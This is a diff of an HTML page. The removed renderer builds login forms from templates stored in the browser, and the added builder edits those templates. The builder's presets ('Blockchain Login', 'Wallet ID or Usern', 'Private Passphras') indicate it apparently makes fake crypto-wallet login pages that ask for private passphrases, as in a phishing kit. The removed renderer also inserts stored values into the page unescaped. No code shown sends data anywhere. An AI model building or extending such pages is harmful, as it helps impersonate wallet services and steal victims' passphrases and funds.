@@ -1,75 +1,215 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Form Template</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Build Template</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 40px;
-      background-color: #f9f9f9;
-    }
-    .template-container {
-      background: white;
-      max-width: 500px;
-      margin: auto;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    .template-container h2 {
-      margin-bottom: 20px;
-    }
-    .template-container input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    .template-container button {
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 5px;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    img {
-      max-width: 100%;
-      margin-bottom: 15px;
-    }
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f9fafb;
+      padding: 20px;
+    }.container {
+  max-width: 600px;
+  margin: auto;
+  background: #ffffff;
+  border-radius: 12px;
+  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.05);
+  padding: 20px;
+}
+
+h2 {
+  text-align: center;
+  margin-bottom: 20px;
+  color: #1a202c;
+}
+
+.section-title {
+  font-weight: bold;
+  margin: 25px 0 10px;
+  font-size: 16px;
+  color: #2d3748;
+  border-bottom: 1px solid #e2e8f0;
+  padding-bottom: 5px;
+}
+
+label {
+  font-weight: 600;
+  display: block;
+  margin-top: 15px;
+  color: #2d3748;
+}
+
+input[type="text"],
+input[type="file"],
+input[type="color"] {
+  width: 100%;
+  padding: 8px;
+  border: 1px solid #cbd5e0;
+  border-radius: 6px;
+  box-sizing: border-box;
+  margin-top: 5px;
+}
+
+.upload-box {
+  display: flex;
+  gap: 10px;
+  align-items: center;
+}
+
+.upload-box input[type="text"] {
+  flex: 1;
+}
+
+.cloud-upload {
+  text-align: center;
+  border: 2px dashed #a0aec0;
+  padding: 20px;
+  border-radius: 10px;
+  background-color: #edf2f7;
+  margin-bottom: 10px;
+}
+
+.cloud-upload i {
+  font-size: 40px;
+  color: #4a5568;
+}
+
+.cloud-upload label {
+  font-weight: 700;
+  display: block;
+  cursor: pointer;
+}
+
+.upload-note {
+  font-size: 12px;
+  color: #718096;
+}
+
+.image-preview {
+  background-color: #f7fafc;
+  text-align: center;
+  padding: 10px;
+  font-weight: bold;
+  color: #4a5568;
+  border: 1px solid #e2e8f0;
+  border-radius: 6px;
+  margin-bottom: 10px;
+}
+
+.input-group {
+  display: flex;
+  gap: 10px;
+}
+
+.generate-button {
+  background-color: #2b6cb0;
+  color: white;
+  padding: 14px;
+  width: 100%;
+  border: none;
+  border-radius: 8px;
+  font-weight: bold;
+  cursor: pointer;
+  margin-top: 30px;
+  transition: background-color 0.3s ease;
+}
+
+.generate-button:hover {
+  background-color: #2c5282;
+}
+
   </style>
 </head>
 <body>
-  <div class="template-container" id="formContainer">Loading...</div>
+  <div class="container">
+    <h2>BUILD TEMPLATE</h2><div class="cloud-upload">
+  <i>☁️</i>
+  <label for="logoUpload">Upload Logo</label>
+  <input type="file" id="logoUpload" accept="image/*" onchange="previewImage(this, 'logoPreview')" style="display:none" />
+  <div class="upload-note">(PNG / JPG / JPEG)</div>
+</div>
+<div class="upload-box">
+  <input type="text" placeholder="ASSETS/FILES/UF" />
+  <input type="text" value='width="70px" height="70px"' />
+</div>
+<div class="image-preview" id="logoPreview">NO IMAGE</div>
 
-  <script>
-    const params = new URLSearchParams(window.location.search);
-    const templateId = params.get('id');
-    const templates = JSON.parse(localStorage.getItem("formTemplates") || "[]");
-    const template = templates.find(t => t.id === templateId);
-    const container = document.getElementById("formContainer");
+<div class="cloud-upload">
+  <i>☁️</i>
+  <label for="bannerUpload">Upload Banner</label>
+  <input type="file" id="bannerUpload" accept="image/*" onchange="previewImage(this, 'bannerPreview')" style="display:none" />
+  <div class="upload-note">(PNG / JPG / JPEG)</div>
+</div>
+<div class="upload-box">
+  <input type="text" placeholder="ASSETS/FILES/UF" />
+  <input type="text" value='width="0px" height=""' />
+</div>
+<div class="image-preview" id="bannerPreview">NO IMAGE</div>
 
-    if (!template) {
-      container.innerHTML = "<p style='color:red;'>❌ Template not found.</p>";
-    } else {
-      document.body.style.backgroundColor = template.bodyColor;
+<label>Template Name</label>
+<input type="text" value="Blockchain" />
 
-      container.innerHTML = `
-        ${template.logo ? `<img src="${template.logo}" ${template.logoSize}>` : ''}
-        ${template.banner ? `<img src="${template.banner}" ${template.bannerSize}>` : ''}
-        <h2 style="color:${template.textColor};">${template.description}</h2>
-        <form>
-          ${template.emailLabel === "SHOW" ? `<input type="text" placeholder="${template.emailContent}" style="color:${template.textColor};">` : ''}
-          ${template.passwordLabel === "SHOW" ? `<input type="password" placeholder="${template.passwordContent}" style="color:${template.textColor};">` : ''}
-          <button type="submit" style="background:${template.buttonColor};width:${template.buttonWidth};">${template.buttonContent}</button>
-        </form>
-      `;
+<label>Body Color</label>
+<input type="color" value="#555577" />
+
+<label>Button Color</label>
+<input type="color" value="#0000ff" />
+
+<label>Text Color</label>
+<input type="color" value="#000000" />
+
+<div class="section-title">INPUTs CONFIGURATION</div>
+
+<label>Description</label>
+<input type="text" value="Blockchain Login" />
+
+<div class="input-group">
+  <div style="flex:1">
+    <label>Email Content</label>
+    <input type="text" value="Wallet ID or Usern" />
+  </div>
+  <div style="flex:1">
+    <label>Email Label</label>
+    <input type="text" value="SHOW" />
+  </div>
+</div>
+
+<div class="input-group">
+  <div style="flex:1">
+    <label>Password Content</label>
+    <input type="text" value="Private Passphras" />
+  </div>
+  <div style="flex:1">
+    <label>Password Label</label>
+    <input type="text" value="SHOW" />
+  </div>
+</div>
+
+<div class="input-group">
+  <div style="flex:1">
+    <label>Button Content</label>
+    <input type="text" value="Log In" />
+  </div>
+  <div style="flex:1">
+    <label>Button Width</label>
+    <input type="text" value="300px" />
+  </div>
+</div>
+
+<button class="generate-button">💾 SAVE</button>
+
+  </div>  <script>
+    function previewImage(input, previewId) {
+      const preview = document.getElementById(previewId);
+      if (input.files && input.files[0]) {
+        const reader = new FileReader();
+        reader.onload = function (e) {
+          preview.innerHTML = `<img src="${e.target.result}" style="max-width: 100%; max-height: 150px; border-radius: 6px;" />`;
+        };
+        reader.readAsDataURL(input.files[0]);
+      } else {
+        preview.innerText = "NO IMAGE";
+      }
     }
-  </script>
-</body>
+  </script></body>
 </html>
